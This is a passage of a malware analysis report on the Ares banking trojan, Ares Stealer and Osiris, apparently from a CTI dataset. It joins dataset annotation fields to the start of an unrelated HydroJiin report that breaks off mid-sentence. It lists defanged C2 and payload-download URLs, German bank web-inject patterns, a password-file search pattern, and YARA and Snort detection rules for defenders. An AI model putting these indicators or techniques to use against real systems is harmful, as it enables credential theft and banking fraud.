D:\\scm\\Italy\\ares\\source\\_ob\\Release\\startup.pdb.\nAres attempts to locate an export name with the hash value F4S4G3S4U7C6P2P7, which maps to the string\u00a0[[email\u00a0protected]](/cdn-cgi/l/email-protection)@[[email\u00a0protected]](/cdn-cgi/l/email-protection).\nOnce the address of this function is located, Ares executes the module.\nAres uses the same function hashing algorithm as Kronos, which consists of calculating a CRC64 hash, converting the digest to uppercase hexadecimal characters.\nThe result is then mapped to an alphanumeric value as shown in the Python code below:\n```\ndigest = hexdigest(crc64(function\\_name)).upper()\nout = \"\"\nfor i in range(len(digest)):\n\u00a0 if i & 1 != 0:\n\u00a0 \u00a0 val = ord(digest[i]) % 9 + ord('0')\n\u00a0 else:\n\u00a0 \u00a0 val = ord(digest[i]) % 25 + ord('A')\n\u00a0 out += chr(val)\nreturn out\n```\nAres contains most of the same code as its predecessors:\u00a0Kronos and Osiris.\nHowever, there are several notable differences between Osiris and Ares, especially with respect to the C2 communications.\nMost Ares samples currently do not communicate with C2 servers over TOR.\nIt is not quite clear, why most Ares samples have the TOR component removed, but it may be to reduce\u00a0the malware's file size and evade corporate firewalls that block TOR network traffic.\nHowever, without TOR, the C2 servers are more vulnerable to takedown attempts.\nSome Ares samples attempt to address this limitation by hardcoding a large number of C2 URLs in the binary.\nZscaler ThreatLabz has observed one Ares sample with [101 hardcoded C2 URLs](https://pastebin.com/XU6YfvWG).\nAres has also slightly modified the bot ID generation code, replacing the string Kronos with the string Ares as shown in Figure 4.\n![](https://lh5.googleusercontent.com/MDGivETH04xsqP4oLDhbRj0NdB2KxfRwJzbZVHVtR1UPrOImlIVer6yeJi1Cy06FImZkPr9pKd_C-roPsF0Dpns_Dz8boz992sW7_m9c45FQRnLwlqYt6257k0AdRXL8ySR7r9ws)\nFigure 4.\nComparison Between Kronos and Ares Bot ID Generation\u00a0\nAres uses the HTTP query string parameters shown in Table 1.\nThe HTTP request that sends the report.zip file is unique to Ares and\u00a0discussed in more detail below.\n| Query String | Description |\n| a=0 | Send log data |\n| a=1 | Download web injects |\n| a=2 | Send keylogger data |\n| a=3 | Send\u00a0report.zip file created by Ares Stealer |\n| a=4 | Request new commands |\nTable 1.\nAres Query String Parameters\n### Ares Commands\nAres supports many of the same commands as Kronos and Osiris.\nHowever, some of the commands have been modified and the malware uninstall command (0x1) was removed.\nThere are four modified commands that are supported by Ares as shown below in Table 2.\n| Command Number | Description |\n| 0x3 | Set registry value name MSE to 0 |\n| 0x4 | Set registry value name MSE to 1 |\n| 0x6 | Download, decompress, map Ares Stealer into memory, and execute |\n| 0xC | Download, decompress, map module into memory, and execute |\nTable 2.\nNew Commands Introduced By Ares\nThe commands 0x3\u00a0and 0x4\u00a0attempt to set a registry value name *MSE* to zero and one, respectively, under the registry key HKEY\\_CURRENT\\_USER\\Software\\Microsoft\\CurrentVersion.\nHowever, this registry key does not exist and both functions will fail.\nThis is likely an oversight by the malware author who accidentally left out\u00a0*Windows*\u00a0in\u00a0this\u00a0registry path between *Microsoft* and *CurrentVersion*.\nThe registry value is not referenced elsewhere in Ares, so it may hint at a future use.\nOne of the most significant modifications is the command 0x6 that downloads, decompresses, and maps a PE file into memory, and executes it.\nCommand 0x6 specifically searches for an export name with the hash value C3E0Q6R7F1H2G5A4, which maps to the string CollectInfo.\nThe code passes two string parameters to the CollectInfo export.\nThe first string is a pattern provided by the C2 server and the second is hardcoded to the string %APPDATA%\\Google\\report.zip.\nZscaler ThreatLabZ has observed this Ares command being used to download a file from the URL http://mydynamite.dynv6[.]net/panel/upload/stealer.dll.\nThe first four bytes of the response are the uncompressed file size.\nThe file is decompressed using the same compression algorithm as BMPack.\nAres has code artifacts from the development of command 0x6.\nSamples contain an unreferenced function that attempts to open a file located at d:\\scm\\Italy\\ares\\source\\_ob\\Binaries\\Release\\KittyDll.dll.cmp.\nThe file is decompressed and mapped into memory using the same process as command 0x6.\nAfter the file is mapped, the export CollectInfo is called with the parameters: %userprofile%Documents|*.txt|5 and NULL.\nThe purpose of these fields will be described in the next section.\nNote that there is\u00a0a missing\u00a0backslash character between %userprofile% and Documents.\nThis string serves as a directory path, and without the backslash the path is\u00a0invalid.\nZscaler ThreatLabZ has also identified Ares samples that contain\u00a0another unreferenced function that\u00a0loads a\u00a0VNC plugin by attempting to open a file located at d:\\scm\\Italy\\ares\\\\source\\_ob\\Binaries\\Release\\vnc.dll.cmp.\nSimilar to the stealer plugin, the file is decompressed, mapped into memory, and the export MakeItStart is called.\nThe MakeItStart export name is resolved similar to the other Ares functions using the same CRC64-based hash algorithm and comparing the result with F0U5R4R6Q8H1P3E5.\nAres then will terminate the VNC plugin by mapping the export name MakeItStop using the same process and comparing the result with the hash value C6P3T6Q8H1P3E5A8.\nThe command 0xC is the most recent modification to Ares and only found in newer samples.\nAres Stealer\n------------\nAres Stealer is downloaded by Ares\u00a0and invoked via the export name CollectInfo.\nThe malware is written in C++ and uses the Boost and Curl libraries.\nAres Stealer has compilation artifacts showing that the Boost library was compiled in the directory d:\\scm\\Italy\\tools\\boost\\_1\\_74\\_0\\boost.\nThis directory prefix is identical to the DarkCrypter\u2019s PDB path and the location where the Ares unreferenced\u00a0test functions attempt to load plugins from.\nThis artifact along with the shared compression code suggests that the malware author likely has developed DarkCrypter, BMPack, Ares, and Ares Stealer.\nThe Ares Stealer export CollectInfo takes two parameters: a pipe-delimited string and a filename string.\nThe pipe-delimited string takes three arguments, which are used by the stealer\u2019s file grabber feature.\nThe first parameter is the directory in which to start the file enumeration process, the second parameter is a search pattern, and the last parameter is the directory search depth.\nThe filename string is used to store the results of the extraction, which are added to a zip file.\nAn example command string observed from an Ares C2 server is %userprofile%|pass*.txt|5.\nThis command will search a victim\u2019s user profile directory up to five levels deep for text files that have the prefix pass.\nAres Stealer collects detailed system information and harvests credentials for numerous applications including FTP clients, VPN clients, web browsers, instant messengers, and email clients.\nIt can also steal files, cryptocurrency wallets, cookies, and credit cards.\nThe stealer will attempt to extract information from the following applications:\nFTP clients\n* Filezilla\nVPN clients\n* NordVPN\n* OpenVPN\n* ProtonVPN\nWeb browsers\n* Mozilla Firefox\n* Google Chrome\n* Microsoft Edge\n* Microsoft Internet Explorer\n* Chromium\n* Cyberfox\n* BlackHawk\n* Comodo IceDragon\n* CometBird\n* SeaMonkey\n* Pale Moon\n* Waterfox\n* Mail.ru Atom\n* Chromodo\n* Uran\n* CocCoc\n* Nichrome\n* Sputnik\n* K-Meleon\n* Maxthon 3\n* 360 Browser\n* Amigo\n* Comodo Dragon\n* Orbitum\n* QIP Surf\n* Liebao\n* Coowon\n* Catalina Group Citrio\n* Fenrir Sleipnir\n* Elements\n* Kometa\n* Chedot\n* CentBrowser\n* 7 Star\n* Iridium\n* MapleStudio ChromePlus\n* Torch\n* Yandex Browser\n* Epic Privacy Browser\n* Opera\n* Brave Browser\n* Vivaldi\n* Blisk\nCryptocurrency wallet applications\n* Coinomi\n* Guarda\n* Atomic Wallet\n* Electrum\n* Ethereum\n* Exodus\n* Bytecoin\n* Armory\n* Zcash\n* Bitcoin\n* Litecoin\nInstant messenger clients\n* Pidgin\nEmail clients\n* Outlook\nOsiris\n------\nThe Osiris version that has been used by this threat actor contains a number of new features since the original version that appeared in April 2018.\nThese updates were introduced around mid-2019 and include the following changes:\n* New beacon request format that includes information about the compromised system\n* Zlib compression to reduce the size of requests and responses (including web injects)\n* Ability to deploy TeamViewer on a compromised host\n* Ability to steal a victim\u2019s Outlook contacts via [Nirsoft\u2019s OutlookAddressBookView](https://www.nirsoft.net/utils/outlook_address_book_view.html) utility\n* Send spam emails to a victim\u2019s contact list\n* New remote access capabilities\nThe threat actor has an Osiris C2 server that is located at http://ylnfkeznzg7o4xjf[.]onion/kpanel/connect.php, which has been instructing infected systems to steal and exfiltrate web browser and email credentials.\nThe web browser harvesting command\u00a0downloads a sqlite3 library from http://qqkzfkax24p4elax[.]onion/kpanel/upload/sqlite3.dll, which is a dependency to extract Google Chrome passwords.\nA second module for harvesting Firefox credentials from a 64-bit system is downloaded from http://qqkzfkax24p4elax[.]onion/kpanel/upload/ffc64.exe.\nThe C2 is also serving a web inject configuration file, which targets clients at\u00a0German financial institutions with the URL patterns shown below:\n**set\\_url** https://*commerzbank.de* GPI\n**set\\_url** https://*.de/*/entry* GPI\n**set\\_url** https://*.de/banking-*/portal?* GPI\n**set\\_url** https://*.de/banking-*/portal;* GPI\n**set\\_url** https://*.de/portal/portal* GPI\n**set\\_url** https://*.de/privatkunden/* GPI\n**set\\_url** https://*.de*abmelden* GPI\n**set\\_url** https://*.de/de/home* GPI\n**set\\_url** https://*.de/en/home* GPI\n**set\\_url** https://*.de/fi/home* GPI\n**set\\_url** https://*banking.sparda.de* GPI\n**set\\_url** https://*banking.sparda-* GPI\n**set\\_url** https://*banking.sparda.de/wps/loggedout.jsp GPI\n**set\\_url** https://*meine.deutsche-bank.de/trxm/db* GPI\n**set\\_url** https://*banking.berliner-bank.de/trxm* GPI\n**set\\_url** https://*meine.norisbank.de/trxm/noris* GPI\n**set\\_url** https://*targobank.de* GPI\nWhen a victim browses to a website that matches one of these patterns, JavaScript code will be injected from the threat actor\u2019s domain https://securebankingapp[.]com/.\nThe full list of web injects for this Osiris instance is shown [here](https://pastebin.com/tTxmjA1K).\nThe threat actor has another active Osiris C2 server located at http://qqkzfkax24p4elax[.]onion/kpanel/connect.php.\nThis C2 server is also serving commands to exfiltrate credentials, but the web inject configuration file is blank.\nHowever, the C2 server is also providing commands to extract a victim\u2019s email contact list using Nirsoft\u2019s OutlookAddressBookView, which is downloaded from the following locations:\nhttp://qqkzfkax24p4elax[.]onion/kpanel/upload/oabv32.exe (32-bit)\nhttp://qqkzfkax24p4elax[.]onion/kpanel/upload/oabv64.exe (64-bit)\nConclusion\n----------\nAres is a new fork of the Kronos banking trojan that appears to be in the early stages of development.\nThe code contains several bugs and unreferenced code segments that are likely used for debugging purposes.\nThe threat actor has invested significant resources in building DarkCrypter, BMPack, Ares, and Ares Stealer.\nTherefore, activity related to this threat is likely to increase as the malware continues to mature.\nDetections\n----------\nZscaler\u2019s multilayered cloud security platform detects indicators at various levels, as shown below:\n[Win32.Banker.Kronos](https://threatlibrary.zscaler.com/threats/80d2bbe9-8d98-4043-8c07-df1f16f03097)\n[Win32.Banker.Kronos.LZ](https://threatlibrary.zscaler.com/threats/e34fc3c7-bde3-4844-ba45-d25e09513b52)\nMITRE ATT&CK Table\n------------------\n| Tactic | Technique |\n| T0011 | Command and Control |\n| T1053 | Scheduled Task/Job |\n| T1078 | Valid Accounts |\n| T1087 | Account Discovery |\n| T1090 | Proxy |\n| T1185 | Man in the Browser |\n| T1219 | Remote Access Software |\n| T1497 | Virtualization/Sandbox Evasion |\n| T1552 | Unsecured Credentials |\n| T1573 | Encrypted Channel |\n| T1592 | Gather Victim Host Information |\nIndicators of Compromise (IOCs)\n-------------------------------\nThe following IOCs can be used to detect Osiris and Ares infections.\n### Samples\n| SHA256 Hash | Module Name |\n| da767e6faf97d73997f397eae71b372a549dd6331bf8ec0ebd398ef8cfe9a47e | Osiris sample |\n| 5e7642e945bd05ecea77921cb3464b6da8db59e5ff38240608e3cbb44b07fb1d | Osiris sample |\n| 7498e37c332d55c14247ae4b675e726336a8683900d8fd1da412905567d2de4a | Ares sample |\n| e5d624b7060c0e885abe11a0973a43a355c9930fc6912ff5eac83d1a9eec9c29 | Ares sample |\n| 035793d479c4229693fc6dcceaa639cd51ae89334b43e552b9c47a6dea68ce30 | Ares sample with embedded Startup module |\n| 94b084ea925990742f4eaaada1eef9a42c13066bf4f4c7a3b12a1509e32ff9e6 | Ares Stealer sample |\n| 09897c6ef88b9e9bc20917a2b47ec86ff2b727a2923678f5e2df6bb6437d3312 | Ares VNC plugin |\n| 896cebf465257f60347e58ffd7ec61629cf530956ef9b00e94f8b40ef9b30581 | DarkCrypter with second-stage BMPack and Osiris sample |\n| 956ae36f40d0d847daa00d7964906e7e9d1671d0f3f2e7d257d5a8d324388c31 | DarkCrypter sample with encrypted Ares payload |\n| 6c5dac9043b2f112543f3eca6503d4bcc70d762b47d75dcb85f9767c603de56f | DarkCrypter sample with compressed Ares TOR payload |\n| b3348405cd0fa66661b46bc6cbab97b55708be26a2ed7a745e1632b46d1b3f41 | DarkCrypter sample with encrypted Ares payload |\n| 4044abad9a846e203f131c65b1f84bb2b79f94000d1d7be6c6d6a8e27ac76940 | BMPack sample with Osiris payload |\n### Network Indicators\n| Domain / IP Address | Description |\n| http://ylnfkeznzg7o4xjf[.]onion/kpanel/connect.php | Osiris C2 URL |\n| http://m3r7ifpzkdix4rf5[.]onion/kpanel/connect.php | Osiris C2 URL |\n| http://qqkzfkax24p4elax[.]onion/kpanel/connect.php | Osiris C2 URL |\n| https://securebankingapp[.]com | Osiris web inject domain |\n| http://vbyrduc537l5po3w[.]onion/panel/connect.php | Ares C2 URL |\n| http://wifoweijijfoiwjweoi[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiiqefmiir[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiilefmjim[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiieeelkif[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiiofelkkq[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiihfelikh[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiiffdkijh[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiigedliji[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiirfdmjks[.]xyz/panel/connect.php | Ares C2 URL |\n| http://ddkiitefkkju[.]xyz/panel/connect.php | Ares C2 URL |\n| http://mydynamite.dynv6[.]net/panel/connect.php | Ares C2 URL |\n| http://cabletv[.]top/panel/connect.php | Ares C2 URL |\n### Yara rules\nThese rules are valid on unpacked Kronos, Osiris, and Ares binaries.\n```\nrule kronos\\_string\\_decryption\n{\n\u00a0\u00a0strings:\u00a0\n\u00a0 \u00a0\u00a0$ = {6a 1e 5f f7 f7 8b 45 08 8d 3c 1e 8a 04 38 8a ?.\n?.\n?.\n?.\n?.\n32 c2}\u00a0 \u00a0\n\u00a0 \u00a0\u00a0$ = {55 8b ec 51 8b 4d 08 c1 e1 04 8b ?.\n?.\n?.\n?.\n?.\n8a}\n\u00a0\u00a0condition:\u00a0\n\u00a0 \u00a0\u00a0all of them\n}\nrule kronos\\_api\\_strings\n{\n\u00a0 strings:\n\u00a0 \u00a0 $ = \"D7T1H5F0F5A4C6S3\"\n\u00a0 \u00a0 $ = \"H2G3F4F0F5A4D5E6\"\n\u00a0 \u00a0 $ = \"X1U5U8H8F5A4C8C5\"\n\u00a0 \u00a0 $ = \"E3D7R6B3R4H5F3R7\"\n\u00a0 \u00a0 $ = \"X8D3U3P7S6Q3S5R1\"\n\u00a0 \u00a0 $ = \"X8D3T6Q6U3S3A6R1\"\n\u00a0 \u00a0 $ = \"R6G2D2R3A5E3C4U5\"\n\u00a0 \u00a0 $ = \"H7Y6G2R3A5F4D3S8\"\n\u00a0 \u00a0 $ = \"P7Y3Q5P0Y8C2Y6F6\"\n\u00a0 \u00a0 $ = \"R6Y7B3C6E7E6T7U7\"\n\u00a0 \u00a0 $ = \"G2F3G6A6R3F1P6G2\"\n\u00a0 \u00a0 $ = \"S3H8T8Y5F5B5B0X0\"\n\u00a0 \u00a0 $ = \"C8G2T3U3B1H3T5B5\"\n\u00a0 \u00a0 $ = \"C4R7A2P4X3B1H5A4\"\n\u00a0 \u00a0 $ = \"R3Q7T7Q2R6S1Y3R5\"\n\u00a0 \u00a0 $ = \"E3C3A2Y3C4U6S5F5\"\n\u00a0 \u00a0 $ = \"F3P7Y6P3U3E2U5F3\"\n\u00a0 \u00a0 $ = \"E5X0A4Q4F0Y0D6E2\"\n\u00a0 \u00a0 $ = \"X2R0A4Q4F0Y0D6F3\"\n\u00a0 \u00a0 $ = \"H1G7R4Y7D1E6R5F8\"\n\u00a0 \u00a0 $ = \"G3C3R4H7R5T8E5R8\"\n\u00a0 \u00a0 $ = \"F6H5P7T4F6D6Y6D4\"\n\u00a0 \u00a0 $ = \"E3C7U2Y3C3R6R5D5\"\n\u00a0 \u00a0 $ = \"F5E8X5G3Q6T7E6T3\"\n\u00a0 \u00a0 $ = \"E1U3D5F7R2Y5S0H4\"\n\u00a0 \u00a0 $ = \"H3Y5C8Y2D4U8Y4S3\"\n\u00a0 \u00a0 $ = \"U0U6H1T2F6S1P2Y5\"\n\u00a0 \u00a0 $ = \"D5R3T8D5D3H0B4E2\"\n\u00a0 \u00a0 $ = \"D5B6G6R4A6H1P7A3\"\n\u00a0 \u00a0 $ = \"F1Q3D0H4H3T6U1X5\"\n\u00a0 \u00a0 $ = \"A4T6P1G7D6G0F3S5\"\n\u00a0 \u00a0 $ = \"C7G5T6P7U5B1H0F5\"\n\u00a0 \u00a0 $ = \"X2C7E3U6F3A7Y1D5\"\n\u00a0 \u00a0 $ = \"P4Y7T7R7R8X3E3A3\"\n\u00a0 \u00a0 $ = \"C5Y7R2R2H1R7A1B2\"\n\u00a0 \u00a0 $ = \"S4A3E3S3S4T1T3D1\"\n\u00a0 \u00a0 $ = \"B4Y2H7F8A2T3G4H3\"\n\u00a0 \u00a0 $ = \"B5D6X4H5G6S3R2B5\"\n\u00a0 \u00a0 $ = \"B6F6X4A8R5D3A7C6\"\n\u00a0 \u00a0 $ = \"C6P7E6P7A1R5Q4R7\"\n\u00a0 \u00a0 $ = \"R8S7D7S8H6Y4T6B7\"\n\u00a0 \u00a0 $ = \"U0S3T3D3U5F5B4E8\"\n\u00a0 \u00a0 $ = \"F6C3U4P4X3B1H3T5\"\n\u00a0 \u00a0 $ = \"T2F2T3U2H5B1C1A7\"\n\u00a0 \u00a0 $ = \"T0E0H4U0X3A3D4D8\"\n\u00a0 \u00a0 $ = \"C5R4X4H7R5T7A5R6\"\n\u00a0 \u00a0 $ = \"D3S0A7R4F6C8F2R5\"\n\u00a0 \u00a0 $ = \"Y1C1B6A7H3C0E7E7\"\n\u00a0 \u00a0 $ = \"H2E7A5B8Q6G3S7Y3\"\n\u00a0 \u00a0 $ = \"D3Q5F2F3R5Y5Y8S2\"\n\u00a0 \u00a0 $ = \"Y2C3G8R5R3A5F5B4\"\n\u00a0 \u00a0 $ = \"F1D2B6A5T3X2C8R1\"\n\u00a0 \u00a0 $ = \"G5D3P2G0F6G2H8E6\"\n\u00a0 \u00a0 $ = \"Y6Q6P2G0E5E6G2H8\"\n\u00a0 \u00a0 $ = \"Y7D3F3S7X2S4F2X3\"\n\u00a0 \u00a0 $ = \"X7D0E3R2R4Q0E4D3\"\n\u00a0 condition:\n\u00a0 \u00a0 25 of them\n}\n```\n### Snort rules\n```\nalert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler TROJAN Ares Command Beacon\"; flow:established,to\\_server; content:\"POST\"; http\\_method; content:\"/connect.php?a=\"; http\\_uri; classtype:trojan-activity; rev:1;)\n```", "mitre_ids": ["TA0011", "TA0011", "T1566", "T1555", "TA0010", "T1027", "T1027", "T1027", "T1497", "T1497", "T1027", "T1027", "T1140", "T1027", "T1036", "T1027", "T1140", "T1140", "T1140", "T1027", "T1140", "T1036", "T1140", "TA0002", "T1189", "T1027", "TA0003", "T1036", "T1036", "T1053", "TA0003", "TA0003", "TA0002", "TA0002", "T1059", "TA0011", "TA0011", "T1071", "TA0005", "TA0011", "TA0011", "TA0011", "T1071", "T1041", "T1105", "T1041", "T1041", "TA0011", "T1112", "T1112", "T1105", "T1105", "T1112", "T1112", "TA0002", "T1105", "TA0011", "T1105", "T1140", "T1140", "TA0010", "T1105", "T1140", "T1070", "T1105", "T1005", "T1005", "TA0011", "T1005", "T1082", "T1555", "T1005", "T1005", "TA0010", "S0086", "T1189", "T1113", "T1114", "T1566", "TA0011", "T1041", "T1555", "T1555", "T1555", "TA0011", "T1189", "T1189", "TA0011", "TA0011", "T1041", "TA0011", "T1041", "TA0011", "T1053", "T1078", "T1087", "T1090", "T1185", "T1219", "T1497", "T1552", "T1592", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "S0154", "T1059", "T1059"], "anno_name_label": [["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "Kronos"], ["MALWARE", "Kronos"], ["CON", "Osiris"], ["CON", "Osiris"], ["MALWARE", "Kronos"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "Ares"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["MALWARE", "DarkCrypter"], ["MALWARE", "DarkCrypter"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Kronos"], ["CON", "Osiris"], ["MALWARE", "Kronos"], ["MALWARE", "DarkCrypter"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TOOL", "UPX Packer"], ["TECHNIQUE", "Command and Scripting Interpreter: Unix Shell"], ["TOOL", "BMPacker"], ["TOOL", "BMPacker"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["TOOL", "BMPacker"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["TOOL", "BMPacker"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["CON", "Osiris"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["TOOL", "BMPacker"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["TOOL", "curl"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["TOOL", "BMPacker"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Electrum"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["MALWARE", "DarkCrypter"], ["TOOL", "BMPacker"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["CON", "Osiris"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["TOOL", "BMPacker"], ["CON", "Osiris"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["MALWARE", "DarkCrypter"], ["MALWARE", "Ares"], ["TOOL", "BMPacker"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Ares"], ["MALWARE", "Kronos"], ["CON", "Osiris"], ["MALWARE", "Ares"], ["MALWARE", "Ares"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI"]}, {"cti_report": "A look at HydroJiin campaign\nApril 14, 2021\nZscaler ThreatLabZ recently came across an interesting campaign involving multiple infostealer RAT families and miner malware.\nWe\u2019ve dubbed the campaign \u201cHydroJiin\u201d based on aliases used by the threat actor.\nThe threat actor is in the business of selling malware, and lurks around in online forums that are common hangouts for neophyte to mid-level cyber criminals.\nWe speculate that the malware author is running widespread campaigns involving different commodity and custom malware to steal information to sell in underground marketplaces.\nSimilar to other attacks outlined in the recent [ThreatLabZ State of Encrypted Attacks report](/blogs/security-research/2020-state-encrypted-attacks), this campaign serves as yet another example of the importance of continuous SSL inspection and [zero trust](/resources/security-terms-glossary/what-is-zero-trust) policies to prevent initial compromise as well as communication back to C&C servers.\nWhile we do not know the impact of this particular campaign, this type of malware is for sale on underground markets to any number of prospective cybercriminals.\nWhile not highly sophisticated, this campaign uses a number of different techniques in order to increase chances of successfully infiltrating organizations who do not take proper precautions.\nThis campaign utilizes a variety of payloads and infection vectors from commodity RATs to custom malware, email spam, backdooring/masquerading as cracked software, and other lures.\nListed below are some of the unique aspects of this campaign:\n* Multilevel infection chain of payloads\u00a0leading from one to the next\n* Custom python-based backdoor deployed along with other RATs (Netwired and Quasar)\n* Python backdoor command checking for MacOS indicating possibility of more cross-platform functionality in the future.\n* Campaign is related to a threat actor who is also involved in distribution of multiple malicious tools via a dedicated malware e-commerce website\n* Possibility of backdoored malware payload similar to [CobianRAT case](/blogs/security-research/cobian-rat-backdoored-rat)\n* Not rare, but heavy use of pastebin to host encoded payloads\n**Infection chain**\n-------------------\n![](https://lh6.googleusercontent.com/A5S5xupCYKAhLz_bT9-TO_M2FkhBkJpSGtv7fTPACDje2l5JSrqAX_RiQBwd3vduCrO7CUfMnQOSKtS-4Hi4EYsfJtkrbUZD2IcsGiC-DMJLzdlqyeL3nE4Qy26ko0Fx4Xv_6ETW)\n***Figure 1: Infection Chain***\nThe infection starts with the delivery of a downloader that downloads\u00a0multiple payloads.\nWe could not confirm the delivery vector of this downloader but in we suspect the use of spam emails and\u00a0cracked software as we have seen in earlier campaigns.\nOnce the attackers achieve initial compromise, the downloader downloads three files:\n* Injector - Used as a loader to inject downloaded payloads into legitimate processes.\n* Netwired RAT - A commodity RAT malware used to control the infected system and steal information.\n* DownloaderShellcode - Obfuscated Meterpreter-based shellcode to download further payloads.\n+ A Pyrome python backdoor is downloaded by this shellcode.\nThis will also download socat and xmrig miner, and finally xmrig miner downloads another RAT named Quasar.\nEach payload and its functionality is explained below.\n### **1 Analysis of downloader payload**\nFirst, the downloader downloads a payload from pastebin and saves to %TEMP% path, with randomly generated names.\nThe ***payload*** hosted on pastebin is encoded in base64 with the text string 